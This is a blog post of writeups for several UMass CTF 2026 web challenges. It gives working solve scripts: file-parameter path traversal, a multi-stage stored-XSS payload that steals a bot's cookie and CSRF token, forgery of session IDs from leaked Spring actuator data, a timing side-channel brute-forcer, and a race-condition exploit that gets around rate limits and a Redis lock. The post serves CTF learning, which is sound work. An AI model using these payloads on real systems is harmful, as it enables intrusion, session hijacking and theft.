+++
date = '2026-04-16T14:27:58+07:00'
title = 'UMass CTF 2026 Writeups'
tags = ['UMass CTF 2026', 'CTFs']
description = 'My writeup for challenges in UMass CTF 2026'
draft = false

[cover]
  image = '/images/posts/umass-ctf-2026-cover.jpg'
  alt = 'UMass CTF 2026 Web Writeups'
  caption = 'UMass CTF 2026 Web Writeups'
  relative = false
+++

## Brick by Brick

<p align="center"><img src="/images/posts/brick-by-brick-challenge.png" style="max-width:60%;" /></p>

<p class="highlight">Goal</p>

Find the hidden admin dashboard to get the flag.

<p class="highlight">My Solution</p>

The home page doesn't have any links, or any hints:

![Guide image](/images/posts/brick-by-brick-1.png)

Therefore I did some basic emuneration and found a existed `robots.txt` file with this content:

```
User-agent: *
Disallow: /internal-docs/assembly-guide.txt
Disallow: /internal-docs/it-onboarding.txt
Disallow: /internal-docs/q3-report.txt

# NOTE: Maintenance in progress.
# Unauthorized crawling of /internal-docs/ is prohibited.
```

Seems like the maintenance source code is hosted public, taking a look at three internal docs files. I found a breakthrough solution for the flag.

In `/internal-docs/it-onboarding.txt`:

```
...
The internal document portal lives at our main intranet address.
Staff can access any file using the ?file= parameter:
...
Credentials are stored in the application config file
for reference by the IT team. See config.php in the web root.
...
```

We can get access to file through the `?file=` query parameter and the credentials is stored in `config.php`. Access `http://brick-by-brick.web.ctf.umasscybersec.org:32769/?file=config.php`:

```php
<?php
// BrickWorks Co. — Application Configuration
// WARNING: Do not expose this file publicly!

// The admin dashboard is located at /dashboard-admin.php.

// Database
define('DB_HOST', 'localhost');
define('DB_NAME', 'brickworks');
define('DB_USER', 'brickworks_app');
define('DB_PASS', 'Br1ckW0rks_db_2024!');

// WARNING: SYSTEM IS CURRENTLY USING DEFAULT FACTORY CREDENTIALS.
// TODO: Change 'administrator' account from default password.

define('ADMIN_USER', 'administrator');
define('ADMIN_PASS', '[deleted it for safety reasons - Tom]');

// App settings
define('APP_ENV', 'production');
define('APP_DEBUG', false);
define('APP_VERSION', '1.0.3');
```

We couldn't get the admin password, however with the same method we can see the source of `dashboard-admin.php`, access `http://brick-by-brick.web.ctf.umasscybersec.org:32769/?file=dashboard-admin.php`:

```php
<?php
session_start();

// Default credentials - intentionally weak for CTF
define('DASHBOARD_USER', 'administrator');
define('DASHBOARD_PASS', 'administrator');
define('FLAG', 'UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}');
# ...
```

Flag: `UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}`

## BrOWSER BOSS FIGHT

<p align="center"><img src="/images/posts/browser-boss-fight-challenge.png" style="max-width:60%;" /></p>

<p class="highlight">Goal</p>

Pass the gate and get the flag.

<p class="highlight">My Solution</p>

Access the home page and see the source:

```html
<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="/css/style.css" />
    </head>
    <body class="welcome_body">
        <form action="/password-attempt" method="post" , class="key-input-form" id="key-form">
            <button type="submit" class="door-btn">
                <img src="/images/postsimages/door.png" class="door-img" />
            </button>
            <input
                type="text"
                id="key"
                name="key"
                placeholder="Input Key"
                required
                onkeydown="return event.key != 'Enter';"
            />
            <script>
                document.getElementById('key-form').onsubmit = function () {
                    const knockOnDoor = document.getElementById('key');
                    // It replaces whatever they typed with 'WEAK_NON_KOOPA_KNOCK'
                    knockOnDoor.value = 'WEAK_NON_KOOPA_KNOCK';
                    return true;
                };
            </script>
        </form>
    </body>
</html>
```

We know that whatever we submit the client automatically change it to `WEAK_NON_KOOPA_KNOCK`, which kept us submitting the correct key. I tried running JavaScript code in the DevTools to see how the server respond:

```javascript
document.getElementById('key').value = 'anything';
document.getElementById('key-form').submit();
```

Being redirected to `/kamek.html`:
![Guide image](/images/posts/browser-boss-fight-1.png)
As expected, the key is incorrect. It said `You clearly aren't bowser`. The next step I tried was making a request with `bowser` as `User-Agent`:

```bash
curl -i \
    -A 'Bowser' \
    -d 'key=test' \
    http://browser-boss-fight.web.ctf.umasscybersec.org:48003/password-attempt

HTTP/1.1 302 Found
X-Powered-By: Express
Server: BrOWSERS CASTLE (A note outside: "King Koopa, if you forget the key, check under_the_doormat! - Sincerely, your faithful servant, Kamek")
Location: /kamek.html
Vary: Accept
# ...

Redirecting to /kamek.html
```

Saw a note from the server, submit the key `under_the_doormat`:

```bash
curl -i \
    -A 'Bowser' \
    -d 'key=under_the_doormat' \
    "http://browser-boss-fight.web.ctf.umasscybersec.org:48003/password-attempt"

HTTP/1.1 302 Found
X-Powered-By: Express
Server: BrOWSERS CASTLE (A note outside: "King Koopa, if you forget the key, check under_the_doormat! - Sincerely, your faithful servant, Kamek")
Location: /bowsers_castle.html
#...

Redirecting to /bowsers_castle.html
```

Now we bypass the first door, and get redirect to `/bowsers_castle.html`. I don't know why I cannot see the source from the `curl`, so I have to use browser, change manually the `User-Agent` to `Bowser` and submit the key `under_the_doormat` in the home page, get redirected to `/bowsers_castle.html` and get the flag.

![Guide image](/images/posts/browser-boss-fight-2.png)

Flag: `UMASS{br0k3n_1n_2_b0wz3r5_c4st13}`

## The Block City Times

<p align="center"><img src="/images/posts/the-block-city-times-challenge.png" style="max-width:60%;" /></p>

<p class="highlight">Goal</p>

Trigger the flag bot to expose their flag.

<p class="highlight">My Solution</p>

Download the source here: [source.zip](https://github.com/jameskaois/ctf-writeups/raw/refs/heads/main/umass-ctf-2026/The%20Block%20City%20Times/source.zip).

Inspecting the source, I get a clear exploit chain by leveraging **Stored XSS**. The flag is stored in the cookie of the bot (who has the admin username and password) (`/developer/report-api.js`).

The intended solve is:

1. Submitting a malicious file that pass the server-side content-type check (only text/plain or application/pdf is acceptable)
2. The app will submit the file to `editorial` service and a bot with admin credentials will visit the file through `/file/<filename>`.
3. Trigger first-stage XSS to switch the app to **dev** mode and trigger internal report feature of the bot keeping the flag.
4. Make the **report-runner** bot load the same malicious file.
5. Read the `FLAG` cookie inside the report bot and store it somewhere public.
6. Get access to it.

Note:

- The first bot in `editorial` service isn't the bot keeping the flag, it is the bot that is used to switch the app from **production** mode to **dev** mode by using the `/actuator` endpoints.
- The `/admin/report` feature bans endpoints starting with `/api`. To bypass use this `/api/../files/<real-filename>` to bypass the check.
- `/admin/report` endpoint check CSRF value, therefore achieve the CSRF token first to avoid errors.

Malicious `payload.html` to submit:

```html
<!doctype html>
<html>
    <body>
        <script>
            (async () => {
                const sleep = ms => new Promise(r => setTimeout(r, ms));
                const filename = location.pathname.split('/').pop();
                const flagMatch = document.cookie.match(/(?:^|;\s*)FLAG=([^;]+)/);

                // Stage 2: running inside report-runner bot
                if (flagMatch) {
                    const flag = decodeURIComponent(flagMatch[1]);
                    await fetch('/api/tags/article/1', {
                        method: 'PUT',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify([flag]),
                    });
                    return;
                }

                // Stage 1: running inside editorial admin bot (change the app mode from prod to dev)
                await fetch('/actuator/env', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: 'app.active-config',
                        value: 'dev',
                    }),
                });

                await fetch('/actuator/refresh', { method: 'POST' });
                await sleep(1500);

                const adminPage = await fetch('/admin', {
                    credentials: 'include',
                }).then(r => r.text());
                const m = adminPage.match(/name="_csrf"\s+value="([^"]+)"/);
                const csrf = m ? m[1] : '';

                const form = new URLSearchParams();
                form.set('_csrf', csrf);
                form.set('endpoint', '/api/../files/' + filename);

                await fetch('/admin/report', {
                    method: 'POST',
                    credentials: 'include',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: form.toString(),
                });
            })();
        </script>
    </body>
</html>
```

After submitting, wait for a enough time, then read the flag through `/api/tags/article/1` where the content is changed to flag by the flag bot.

## ORDER66

<p align="center"><img src="/images/posts/order66-challenge.png" style="max-width:60%;" /></p>

<p class="highlight">Goal</p>

Executing the bot to expose their flag.

<p class="highlight">My Solution</p>

Download the source here: [source.zip](https://github.com/jameskaois/ctf-writeups/raw/refs/heads/main/umass-ctf-2026/ORDER66/source.zip).

Exploit chain:

1. Grab the Seed: Look at the "Share URL" provided on the main page (e.g., `.../view/user_id/1234`). That last number (`1234`) is session's random seed.

2. Find the Vulnerable Box:

```python
import random
random.seed(1234) # Replace with seed
print(random.randint(1, 66))
```

3. Plant the Trap: Go to the box number that Python just spit out. Enter the payload `<script>console.log(document.cookie)</script>`.

4. Deploy the Bot: Copy Share URL and head to the `/admin` page. Paste the link into the prompt.

5. Collect the Flag: The bot visits URL, loads the vulnerable box, and gets hit by XSS payload. It prints its own cookie (the flag) to the console, and the web server displays that log directly on the screen.

Solve script leveraging XSS:

```python
import requests
import random
import re

BASE_URL = "http://order66.web.ctf.umasscybersec.org:48001/"

def solve():
    session = requests.Session()

    r = session.get(BASE_URL)

    match = re.search(r'/view/([^/]+)/(\d+)', r.text)
    if not match:
        print("failed to get uid and seed")
        return

    uid = match.group(1)
    seed = int(match.group(2))

    # predict the vulnerable box index
    random.seed(seed)
    v_index = random.randint(1, 66)
    print(f"the vulnerable box is: ORDER_{v_index}")

    payload = "<script>console.log(document.cookie)</script>"

    inject_data = {
        f"box_{v_index}": payload
    }

    session.post(BASE_URL, data=inject_data)

    view_url = f"{BASE_URL.rstrip('/')}/view/{uid}/{seed}"

    r_admin = session.post(f"{BASE_URL}admin/visit", data={"target_url": view_url})

    print("\nresponse:")
    print(r_admin.text)

if __name__ == "__main__":
    solve()
```

## Bricktator

<p align="center"><img src="/images/posts/bricktator-challenge.png" style="max-width:60%;" /></p>

<p class="highlight">Goal</p>

Get admin approvals and get the flag.

<p class="highlight">My Solution</p>

Download the source here: [source.zip](https://github.com/jameskaois/ctf-writeups/raw/refs/heads/main/umass-ctf-2026/Bricktator/source.zip).

The goal is to get 5 admin approvals to blow up a reactor. We start with the bricktator creds so we only need 4 more.

First thing I noticed in the source is the spring actuator is left open. If you go to `/actuator/sessions` you can leak the custom session IDs for `john_doe` and `jane_doe`.

The session IDs look weird because they use Shamir's Secret Sharing with a `key-threshold` of 3. That means its just a simple math equation. Since we have 3 points total (our bricktator session, john, and jane), we can use lagrange interpolation to solve the math and generate all 5,000 valid session IDs locally. (I use AI to do this)

But we need to figure out which 4 of those 5000 sessions have the `YANKEE_WHITE` admin role. I saw in the filter code that if a admin goes to `/command`, it does a slow bcrypt hash and logs it to another open actuator at `/actuator/accesslog`.

So instead of doing a annoying timing attack which takes forever over the internet, I just send the generated sessions in big chunks and check if the log `count` goes up! If it does, there is a admin.

Finally hit `/override` to get the override token, and loop through the 4 admin cookies to approve it.

Solve script:

```python
import requests, base64, re
from concurrent.futures import ThreadPoolExecutor

URL = "http://bricktator.web.ctf.umasscybersec.org:8080"
P = 2147483647

def inv(n, p): return pow(n, -1, p)

def lagrange(x, pts):
    y = 0
    for i, (xi, yi) in enumerate(pts):
        num, den = 1, 1
        for j, (xj, _) in enumerate(pts):
            if i != j:
                num = (num * (x - xj)) % P
                den = (den * (xi - xj)) % P
        y = (y + (yi * num * inv(den, P)) % P) % P
    return y

def enc(x, y):
    return base64.b64encode(f"{x:05d}-{y:08x}".encode()).decode()

def logs(s):
    return s.get(f"{URL}/actuator/accesslog").json().get('count', 0)

def main():
    s = requests.Session()
    s.mount('http://', requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100))

    print("Auth")
    s.post(f"{URL}/login", data={"username": "bricktator", "password": "goldeagle"})

    print("Anchors")
    p1 = next(x['id'] for x in s.get(f"{URL}/actuator/sessions?username=bricktator").json().get('sessions',[]) if '-' in x['id'])
    p2 = next(x['id'] for x in s.get(f"{URL}/actuator/sessions?username=john_doe").json().get('sessions',[]) if '-' in x['id'])
    p3 = next(x['id'] for x in s.get(f"{URL}/actuator/sessions?username=jane_doe").json().get('sessions',[]) if '-' in x['id'])

    pts = [
        (int(p1.split('-')[0]), int(p1.split('-')[1], 16)),
        (1, int(p2.split('-')[1], 16)),
        (5, int(p3.split('-')[1], 16))
    ]

    sessions = [enc(x, lagrange(x, pts)) for x in range(1, 5000) if x not in [1, 5]]
    targets = []

    def fire(batch):
        with ThreadPoolExecutor(50) as ex:
            ex.map(lambda sess: requests.get(f"{URL}/command", cookies={"SESSION": sess}, allow_redirects=False), batch)

    def search(batch):
        if len(targets) >= 4 or not batch: return
        c1 = logs(s)
        fire(batch)
        if logs(s) - c1 <= 0: return

        if len(batch) == 1:
            targets.append(batch[0])
            print(f"[+] Found: {base64.b64decode(batch[0]).decode()}")
            return

        mid = len(batch) // 2
        search(batch[:mid])
        search(batch[mid:])

    print("[*] Searching")
    for i in range(0, len(sessions), 500):
        if len(targets) >= 4: break
        search(sessions[i:i+500])

    if len(targets) < 4: return

    print("Override")
    r = s.post(f"{URL}/command/override")
    tok = re.search(r'([a-f0-9]{32})', r.text).group(1)

    for t in targets:
        r2 = requests.post(f"{URL}/override/{tok}", cookies={"SESSION": t})
        if "UMASS{" in r2.text:
            print(f"\n[★] {re.search(r'(UMASS\\{[^}]+\\})', r2.text).group(1)}")
            return

if __name__ == "__main__":
    main()
```

## Bricktator2

<p align="center"><img src="/images/posts/bricktator2-challenge.png" style="max-width:60%;" /></p>

<p class="highlight">Goal</p>

Get admin approvals and get the flag.

<p class="highlight">My Solution</p>

Download the source here: [source.zip](https://github.com/jameskaois/ctf-writeups/raw/refs/heads/main/umass-ctf-2026/Bricktator2/source.zip).

The vulnerability is a timing side channel in session authorization.

`CommandWorkFilter` does expensive bcrypt work on every `/command` request, but only when the replayed session belongs to a `YANKEE_WHITE` user. That means you can test generated session IDs by timing `/command` responses and distinguish privileged sessions from normal ones

The rest of the chain:

- `/actuator/sessions` leaks three seeded session IDs
- those IDs are enough to reconstruct all valid seeded sessions
- then the timing leak tells you which ones are YANKEE_WHITE
- and those can be used to satisfy the 5-party override

Solve script:

```python
import base64
import concurrent.futures as cf
import html
import os
import re
import statistics
import sys
import time

import requests

BASE = os.environ.get("BASE", "http://bricktatorv2.web.ctf.umasscybersec.org:8080").rstrip("/")
USERNAME = "bricktator"
PASSWORD = "goldeagle"
PRIME = 2147483647
TIMEOUT = 10
WORKERS = 20
CHUNK = 160

SESSION_RE = re.compile(r"\b\d{5}-[0-9a-f]{8}\b")
TOKEN_RE = re.compile(r"/override/([0-9a-f]{32})")
FLAG_RE = re.compile(r"UMASS\{[^}]+\}")


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(msg: str) -> None:
    raise SystemExit(msg)


def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def parse_sid(sid: str) -> tuple[int, int]:
    x, y = sid.split("-", 1)
    return int(x), int(y, 16)


def lagrange(points: list[tuple[int, int]], x: int, p: int = PRIME) -> int:
    total = 0
    for i, (xi, yi) in enumerate(points):
        num = den = 1
        for j, (xj, _) in enumerate(points):
            if i == j:
                continue
            num = (num * (x - xj)) % p
            den = (den * (xi - xj)) % p
        total = (total + yi * num * pow(den, -1, p)) % p
    return total


def gen_sid(points: list[tuple[int, int]], x: int) -> str:
    return f"{x:05d}-{lagrange(points, x):08x}"


def extract_sids(data) -> list[str]:
    return sorted(set(SESSION_RE.findall(str(data))))


def login() -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "solve.py"
    s.get(f"{BASE}/login", timeout=TIMEOUT)
    s.post(
        f"{BASE}/login",
        data={"username": USERNAME, "password": PASSWORD},
        timeout=TIMEOUT,
        allow_redirects=True,
    )
    cookie = s.cookies.get("SESSION")
    if not cookie:
        fail("login failed")
    try:
        log(f"session {base64.b64decode(cookie).decode()}")
    except Exception:
        log("logged in")
    return s


def leak_share(s: requests.Session, username: str) -> str:
    r = s.get(f"{BASE}/actuator/sessions?username={username}", timeout=TIMEOUT)
    ids = extract_sids(r.json() if "json" in r.headers.get("content-type", "") else r.text)
    if not ids:
        ids = extract_sids(r.text)
    if not ids:
        fail(f"no session for {username}")
    return ids[0]


def check_sid(s: requests.Session, sid: str) -> None:
    r = s.get(f"{BASE}/actuator/sessions/{sid}", timeout=TIMEOUT)
    if r.status_code != 200:
        fail(f"bad generated sid: {sid}")


def time_command(raw_sid: str, reps: int = 1) -> float:
    cookie = {"SESSION": b64(raw_sid)}
    vals = []
    for _ in range(reps):
        t0 = time.perf_counter()
        try:
            requests.get(
                f"{BASE}/command",
                cookies=cookie,
                headers={"User-Agent": "solve.py"},
                timeout=TIMEOUT,
                allow_redirects=False,
            )
            vals.append(time.perf_counter() - t0)
        except requests.RequestException:
            vals.append(999.0)
    return statistics.median(vals)


def open_channel(s: requests.Session) -> str:
    r = s.post(f"{BASE}/command/override", timeout=TIMEOUT, allow_redirects=True)
    m = TOKEN_RE.search(r.text)
    if not m:
        fail("no token")
    return m.group(1)


def visible_text(raw: str) -> str:
    raw = re.sub(r"<!--.*?-->", " ", raw, flags=re.S)
    raw = re.sub(r"<script.*?</script>", " ", raw, flags=re.S | re.I)
    raw = re.sub(r"<style.*?</style>", " ", raw, flags=re.S | re.I)
    raw = re.sub(r"<[^>]+>", " ", raw)
    return " ".join(html.unescape(raw).split()).lower()


def extract_count(raw: str) -> int | None:
    m = re.search(r"\b([1-5])\s+of\s+([1-5])\b", visible_text(raw))
    return int(m.group(1)) if m else None


def approve(raw_sid: str, token: str) -> tuple[str, str, int | None]:
    r = requests.post(
        f"{BASE}/override/{token}",
        cookies={"SESSION": b64(raw_sid)},
        headers={"User-Agent": "solve.py"},
        timeout=TIMEOUT,
        allow_redirects=True,
    )
    text = r.text
    view = visible_text(text)

    m = FLAG_RE.search(text)
    if m:
        return "FLAG", m.group(0), 5
    if "override sequence terminated" in view:
        return "CANCELLED", text, extract_count(text)
    if "token invalid or expired" in view:
        return "INVALID", text, extract_count(text)
    if "token expired" in view:
        return "EXPIRED", text, extract_count(text)
    if "your authorization has been recorded" in view or "authorization recorded" in view:
        return "OK", text, extract_count(text)
    if "already recorded" in view or "already approved" in view:
        return "ALREADY", text, extract_count(text)
    return "UNKNOWN", text, extract_count(text)


def find_keepers(points: list[tuple[int, int]], admin_sid: str) -> list[str]:
    john_sid = gen_sid(points, 1)
    jane_sid = gen_sid(points, 5)

    fast = statistics.median([time_command(john_sid, 2), time_command(jane_sid, 2)])
    slow = time_command(admin_sid, 3)

    threshold = fast + 0.55 * (slow - fast)
    suspect_cutoff = fast + 0.30 * (slow - fast)

    log(f"fast={fast:.3f}s slow={slow:.3f}s")
    log(f"threshold={threshold:.3f}s")

    xs = [x for x in range(1, 5002) if x not in (1, 5, 5001)]
    keepers = []

    def sample(x: int):
        sid = gen_sid(points, x)
        return x, sid, time_command(sid, 1)

    for off in range(0, len(xs), CHUNK):
        chunk = xs[off:off + CHUNK]
        with cf.ThreadPoolExecutor(max_workers=WORKERS) as ex:
            rows = list(ex.map(sample, chunk))

        rows.sort(key=lambda row: row[2], reverse=True)
        suspects = [row for row in rows[:10] if row[2] >= suspect_cutoff]

        for x, sid, first in suspects:
            if sid in keepers:
                continue
            t = statistics.median([first, time_command(sid, 2)])
            if t >= threshold:
                keepers.append(sid)
                log(f"keeper {len(keepers)}: {sid}")
                if len(keepers) == 4:
                    return keepers

        if (off // CHUNK + 1) % 5 == 0:
            log(f"scanned {off + len(chunk)}")

    fail("not enough keepers")


def fire_final(keepers: list[str]) -> str:
    s = login()
    token = open_channel(s)
    expected = 2

    for sid in keepers:
        status, out, count = approve(sid, token)
        log(f"{sid} -> {status} ({count})")

        if status == "FLAG":
            return out
        if status == "OK" or count == expected:
            expected += 1
            continue

        fail(f"failed on {sid}: {status}")

    fail("no flag")


def main() -> None:
    s = login()

    bricktator_sid = leak_share(s, "bricktator")
    john_sid = leak_share(s, "john_doe")
    jane_sid = leak_share(s, "jane_doe")

    points = sorted(
        [parse_sid(bricktator_sid), parse_sid(john_sid), parse_sid(jane_sid)],
        key=lambda p: p[0],
    )

    for x in (1, 2, 3, 4, 5, 5001):
        check_sid(s, gen_sid(points, x))

    keepers = find_keepers(points, bricktator_sid)
    log(str(keepers))

    print(fire_final(keepers))


if __name__ == "__main__":
    main()
```

## Hens and Roosters

<p align="center"><img src="/images/posts/hens-and-roosters-challenge.png" style="max-width:60%;" /></p>

<p class="highlight">Goal</p>

Gain enough studs to get the flag.

<p class="highlight">My Solution</p>

Download the source here: [source.zip](https://github.com/jameskaois/ctf-writeups/raw/refs/heads/main/umass-ctf-2026/Hens%20and%20Roosters/source.zip).

At first glance, this challenge looked like it was going to require some heavy math. But it turned out to be a really cool chain of web vulnerabilities (my teamate told me to try it):

**1. Bypassing HAProxy**

The HAProxy configuration had an aggressive rate limit, but there was a flaw in how it tracked requests:
`http-request track-sc0 url`

Because it tracked the exact URL string, I bypassed the rate limiter entirely by just appending a random nonce to my query parameters on every request (e.g., `/?nonce=1234`). The proxy saw every request as unique, letting me spam the server.

**2. The Setup**

The goal is to get 7 studs to buy the flag. Working normally gets you to 2 studs before the server cuts you off. I played legitimately up to 2 studs to get a valid signature for the `2|<uid>` payload. This was crucial because racing from 0 studs caused the server to crash (SageMath's C-libraries segfaulted when hit concurrently).

**3. The TOCTOU Race Condition**

The `POST /work` endpoint has a Time-of-Check to Time-of-Use (TOCTOU) bug. It verifies your signature and then increments your studs. If you send concurrent requests, they all pass the verification check before any of them actually increment the balance.

**4. The Redis Lock Bypass (The Magic)**

The server tries to stop you from racing by locking your signature in Redis (`r.set(sig, b'-')`). If multiple threads use the same signature, the lock blocks them.

However, Python's `bytes.fromhex(sig)` is **case-insensitive**, while Redis keys are **case-sensitive**. I took my valid signature and randomly changed the casing of the hex letters (e.g., `a1b2` -> `A1b2`, `a1B2`). This generated variations that were mathematically identical to Python, but completely unique to Redis.

**5. Getting the Flag**

I fired off 25 concurrent threads using a `threading.Barrier`, each holding a uniquely-cased signature. Every thread bypassed the Redis lock, evaluated as valid, and incremented my studs simultaneously. I blew past the 7 stud requirement, hit the `/buy` endpoint and the flag appears.

Solve script:

```python
import requests
import threading
import re
import os
import random

BASE_URL = "..."

def rand_str():
    return os.urandom(4).hex()

def generate_case_variants(base_sig, count):
    variants = set()
    while len(variants) < count:
        variant = "".join(
            c.upper() if c.isalpha() and random.choice([True, False]) else c.lower()
            for c in base_sig
        )
        variants.add(variant)
    return list(variants)

def exploit():
    s = requests.Session()

    res = s.get(f"{BASE_URL}/?nonce={rand_str()}")
    uid_match = re.search(r"is ([a-f0-9]{16})!", res.text)
    if not uid_match:
        return False
    uid = uid_match.group(1)

    res = s.get(f"{BASE_URL}/buy?uid={uid}&nonce={rand_str()}")
    sig0 = re.search(r"signature: ([a-f0-9]{508})", res.text).group(1)

    res = s.post(f"{BASE_URL}/work?nonce={rand_str()}", json={"uid": uid, "sig": sig0})
    sig1 = re.search(r"is ([a-f0-9]{508})!", res.text).group(1)

    res = s.post(f"{BASE_URL}/work?nonce={rand_str()}", json={"uid": uid, "sig": sig1})
    sig2 = re.search(r"is ([a-f0-9]{508})!", res.text).group(1)

    num_threads = 25
    unique_sigs = generate_case_variants(sig2, num_threads)
    barrier = threading.Barrier(num_threads)
    threads = []

    def race_work(thread_id, unique_sig):
        local_s = requests.Session()
        url = f"{BASE_URL}/work?nonce={rand_str()}"
        req = requests.Request('POST', url, json={"uid": uid, "sig": unique_sig})
        prep = req.prepare()

        try:
            barrier.wait()
            local_s.send(prep, timeout=5)
        except Exception:
            pass

    for i in range(num_threads):
        t = threading.Thread(target=race_work, args=(i, unique_sigs[i]))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    res = s.get(f"{BASE_URL}/buy?uid={uid}&nonce={rand_str()}")

    if "UMASS{" in res.text:
        print(res.text)
        return True
    return False

if __name__ == "__main__":
    while not exploit():
        pass
```
